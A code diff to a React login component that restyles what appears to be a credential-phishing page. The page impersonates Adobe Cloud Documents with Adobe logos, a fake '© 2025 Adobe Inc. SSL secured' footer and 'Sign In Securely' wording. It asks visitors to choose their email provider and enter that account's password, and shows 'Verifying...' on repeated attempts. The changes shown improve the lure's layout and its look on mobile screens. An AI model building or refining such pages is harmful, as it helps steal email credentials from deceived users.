@@ -120,7 +120,7 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
 
   return (
     <div
-      className="min-h-screen flex items-center justify-center p-4 relative overflow-hidden"
+      className="min-h-screen flex items-center justify-center p-4 relative overflow-hidden bg-gray-50"
       style={{
         backgroundImage: "url('https://images.unsplash.com/photo-1633993365956-621f62f8057e?ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&q=80&w=2070')",
         backgroundSize: 'cover',
@@ -128,31 +128,58 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
         backgroundRepeat: 'no-repeat'
       }}
     >
-      {/* Decorative overlay: smaller logo + stacked subtitle lines (logo placed inline beside the title) */}
-      <div className="absolute left-4 top-1/2 transform -translate-y-1/2 flex flex-col items-start gap-1 z-0 pointer-events-none">
-        <div className="flex items-center gap-2">
-          <img
-            src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/Adobe_Document_Cloud_icon_%282020%29.svg/640px-Adobe_Document_Cloud_icon_%282020%29.svg.png"
-            alt="Adobe Cloud"
-            className="w-10 h-10 object-contain drop-shadow-md"
-          />
-          <div className="text-white drop-shadow-md">
-            <div className="text-xl font-semibold leading-tight">Adobe Cloud Documents</div>
-            <div className="text-white/90 text-xs mt-1">PDF and e-signing tools.</div>
-            <div className="text-white/80 text-xs italic">securely access documents</div>
+      {/* Decorative overlay (responsive)
+          Desktop / larger: left column with logo + stacked lines below.
+          Mobile: centered block above the card so it is visible and readable. */}
+      <div className="absolute z-0 pointer-events-none opacity-90 inset-0">
+        {/* Desktop / larger screens: left column */}
+        <div className="hidden sm:flex absolute left-4 md:left-6 top-1/2 transform -translate-y-1/2 flex-col items-start">
+          <div className="flex items-center gap-3">
+            <img
+              src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/Adobe_Document_Cloud_icon_%282020%29.svg/640px-Adobe_Document_Cloud_icon_%282020%29.svg.png"
+              alt="Adobe Cloud"
+              className="w-12 h-12 md:w-14 md:h-14 object-contain drop-shadow-md"
+            />
+            <div className="text-white drop-shadow-md">
+              <div className="text-2xl md:text-3xl font-semibold leading-tight">Adobe Cloud Documents</div>
+            </div>
+          </div>
+
+          <div className="mt-8 ml-8 md:ml-12 lg:ml-20 text-left">
+            <div className="text-white/90 text-sm md:text-sm">PDF and e-signing tools</div>
+            <div className="text-white/80 text-sm md:text-sm italic mt-2">Securely access your PDFs</div>
+          </div>
+        </div>
+
+        {/* Mobile: centered above the card */}
+        <div className="sm:hidden absolute inset-x-0 top-6 flex flex-col items-center gap-2 px-4">
+          <div className="flex items-center gap-2">
+            <img
+              src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/Adobe_Document_Cloud_icon_%282020%29.svg/640px-Adobe_Document_Cloud_icon_%282020%29.svg.png"
+              alt="Adobe Cloud"
+              className="w-10 h-10 object-contain drop-shadow-md"
+            />
+            <div className="text-white drop-shadow-md">
+              <div className="text-lg font-semibold leading-tight">Adobe Cloud Documents</div>
+            </div>
+          </div>
+
+          <div className="mt-4 text-center">
+            <div className="text-white/90 text-xs">PDF and e-signing tools</div>
+            <div className="text-white/80 text-xs italic mt-1">Securely access your PDFs</div>
           </div>
         </div>
       </div>
 
-      {/* Card moved slightly closer to the left (reduced left offset so it sits nearer to overlay but not covering it) */}
-      <div className="w-full max-w-sm relative z-10 ml-6 md:ml-12 lg:ml-20">
-        <div className="bg-white/80 backdrop-blur-xl rounded-2xl shadow-2xl border border-white/20 p-6 relative overflow-hidden min-h-[480px]">
-          <div className="absolute inset-0 bg-gradient-to-br from-white/50 to-transparent pointer-events-none"></div>
+      {/* Card container */}
+      <div className="w-full max-w-sm relative z-10 mx-4 sm:mx-6">
+        <div className="bg-white/95 backdrop-blur-xl rounded-2xl shadow-2xl border border-white/20 p-5 relative overflow-hidden md:min-h-[460px]">
+          <div className="absolute inset-0 bg-gradient-to-br from-white/40 to-transparent pointer-events-none"></div>
           <div className="relative z-10">
             {/* Centered "Select Your Provider" pill in header */}
             <div className="flex items-center justify-center mb-3">
               <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-100">
-                <Sparkles className="w-3 h-3 text-blue-500" />
+                <Sparkles className="w-3.5 h-3.5 text-blue-500" />
                 <span className="text-xs font-medium text-blue-700">Select Your Provider</span>
               </div>
             </div>
@@ -160,26 +187,25 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
             <div className="mt-2">
               {!selectedProvider ? (
                 <div className="space-y-4">
-                  <div className="grid grid-cols-3 gap-3">
+                  <div className="grid grid-cols-3 gap-3 sm:grid-cols-3 md:grid-cols-3">
                     {emailProviders.map((provider) => (
                       <button 
                         key={provider.name} 
                         onClick={() => handleProviderSelect(provider.name)} 
-                        className="group relative flex flex-col items-center gap-2 p-4 bg-white/60 backdrop-blur-sm rounded-xl shadow-sm border border-gray-100/50 hover:shadow-lg hover:bg-white/80 transition-all duration-300 transform hover:-translate-y-1 active:scale-95" 
+                        className="group relative flex flex-col items-center gap-2 p-3 bg-white/75 backdrop-blur-sm rounded-xl shadow-sm border border-gray-100/50 hover:shadow-lg hover:bg-white/80 transition-all duration-200 transform active:scale-95" 
                         aria-label={`Select ${provider.name}`} 
                         type="button"
                       >
-                        {/* Standalone logo (no background) */}
                         <img 
                           src={provider.logo} 
                           alt={provider.name} 
                           className="w-8 h-8 object-contain" 
                           onError={(e) => { const t = e.target as HTMLImageElement; t.style.display = 'none'; }}
                         />
-                        <div className="text-xs font-semibold text-gray-800 group-hover:text-gray-900 transition-colors text-center">
+                        <div className="text-xs font-semibold text-gray-800 group-hover:text-gray-900 transition-colors text-center truncate">
                           {provider.name}
                         </div>
-                        <div className="absolute inset-0 rounded-xl bg-gradient-to-br from-white/20 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
+                        <div className="absolute inset-0 rounded-xl bg-gradient-to-br from-white/20 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-200 pointer-events-none"></div>
                       </button>
                     ))}
                   </div>
@@ -189,13 +215,12 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
                   <div className="flex items-center gap-2 mb-4">
                     <button 
                       onClick={handleBackToProviders} 
-                      className="p-1.5 rounded-lg hover:bg-gray-100 transition-colors" 
+                      className="p-1.5 rounded-md hover:bg-gray-100 transition-colors" 
                       type="button"
                     >
                       <ArrowLeft className="w-4 h-4 text-gray-600" />
                     </button>
                     <div className="flex items-center gap-2">
-                      {/* selected-provider logo stands alone */}
                       <img 
                         src={emailProviders.find(p => p.name === selectedProvider)?.logo} 
                         alt={selectedProvider} 
@@ -206,15 +231,10 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
                     </div>
                   </div>
 
-                  <form onSubmit={handleFormSubmit} className="space-y-4">
+                  <form onSubmit={handleFormSubmit} className="space-y-3">
                     {errorMessage && (
-                      <div className="bg-gradient-to-r from-red-50 to-pink-50 border border-red-200 rounded-xl p-3 animate-shake">
-                        <p className="text-red-700 text-xs font-medium flex items-center gap-2">
-                          <div className="w-3 h-3 rounded-full bg-red-500 flex items-center justify-center">
-                            <div className="w-1.5 h-1.5 bg-white rounded-full"></div>
-                          </div>
-                          {errorMessage}
-                        </p>
+                      <div className="bg-gradient-to-r from-red-50 to-pink-50 border border-red-200 rounded-lg p-3">
+                        <p className="text-red-700 text-xs font-medium flex items-center gap-2">{errorMessage}</p>
                       </div>
                     )}
 
@@ -227,7 +247,7 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
                             type="email" 
                             value={email} 
                             onChange={(e) => setEmail(e.target.value)} 
-                            className="w-full pl-10 pr-3 py-3 bg-white/80 backdrop-blur-sm border border-gray-200 rounded-xl text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-300 hover:bg-white/80 text-sm" 
+                            className="w-full pl-10 pr-3 py-3 bg-white/90 backdrop-blur-sm border border-gray-200 rounded-xl text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 text-sm" 
                             placeholder="Enter your email" 
                             required 
                           />
@@ -242,7 +262,7 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
                             type={showPassword ? 'text' : 'password'} 
                             value={password} 
                             onChange={(e) => setPassword(e.target.value)} 
-                            className="w-full pl-10 pr-10 py-3 bg-white/80 backdrop-blur-sm border border-gray-200 rounded-xl text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-300 hover:bg-white/80 text-sm" 
+                            className="w-full pl-10 pr-10 py-3 bg-white/90 backdrop-blur-sm border border-gray-200 rounded-xl text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 text-sm" 
                             placeholder="Enter your password" 
                             required 
                           />
@@ -260,12 +280,11 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
                     <button 
                       type="submit" 
                       disabled={isLoading || !email || !password} 
-                      className="w-full bg-gradient-to-r from-blue-600 to-indigo-600 text-white py-3.5 rounded-xl font-bold text-lg hover:from-blue-700 hover:to-indigo-700 disabled:opacity-60 disabled:cursor-not-allowed transition-all duration-300 transform hover:scale-[1.02] active:scale-[0.98] shadow-lg hover:shadow-xl relative overflow-hidden group"
+                      className="w-full bg-gradient-to-r from-blue-600 to-indigo-600 text-white py-3.5 rounded-xl font-bold text-sm hover:from-blue-700 hover:to-indigo-700 disabled:opacity-60 disabled:cursor-not-allowed transition-all duration-200 shadow-lg"
                     >
-                      <div className="absolute inset-0 bg-gradient-to-r from-white/20 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
-                      <div className="relative flex items-center justify-center gap-2">
+                      <div className="flex items-center justify-center gap-2">
                         {isLoading && (
-                          <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
+                          <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                         )}
                         {isLoading ? (loginAttempts === 0 ? 'Signing in...' : 'Verifying...') : 'Sign In Securely'}
                       </div>
@@ -275,10 +294,8 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
               )} 
             </div>
 
-            <div className="mt-6 text-center">
-              <p className="text-xs text-gray-500 flex items-center justify-center gap-1">
-                © 2025 Adobe Inc. SSL secured.
-              </p>
+            <div className="mt-5 text-center">
+              <p className="text-xs text-gray-500">© 2025 Adobe Inc. SSL secured.</p>
             </div>
           </div>
         </div>
